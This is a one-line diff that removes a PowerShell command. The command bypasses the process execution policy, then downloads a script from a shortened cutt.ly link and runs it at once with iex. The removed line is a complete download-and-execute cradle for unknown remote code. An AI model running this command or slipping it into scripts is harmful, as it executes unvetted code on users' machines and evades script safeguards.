@@ -1,1 +1,0 @@
-PowerShell.exe -Command "& {Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://cutt.ly/4rYDclt'))}"
